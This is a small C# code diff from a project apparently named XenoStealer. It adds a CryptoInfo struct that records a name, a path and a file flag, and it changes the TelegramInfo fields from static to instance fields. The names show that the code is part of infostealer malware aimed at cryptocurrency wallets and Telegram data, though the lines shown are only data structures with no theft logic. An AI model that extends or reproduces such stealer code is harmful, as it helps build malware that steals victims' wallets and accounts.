@@ -9,10 +9,26 @@ namespace XenoStealer
 {
     public static class DataExtractionStructs
     {
+
+        public struct CryptoInfo 
+        {
+            public string name;
+            public string path;
+            public bool isFile;
+
+            public CryptoInfo(string _name, string _path, bool _isFile) 
+            {
+                name = _name;
+                path = _path;
+                isFile = _isFile;
+            }
+
+        }
+
         public struct TelegramInfo 
         { 
-            public static string rootPath;
-            public static string[] files;
+            public string rootPath;
+            public string[] files;
             public TelegramInfo(string _rootPath, string[] _files) 
             {
                 rootPath = _rootPath;
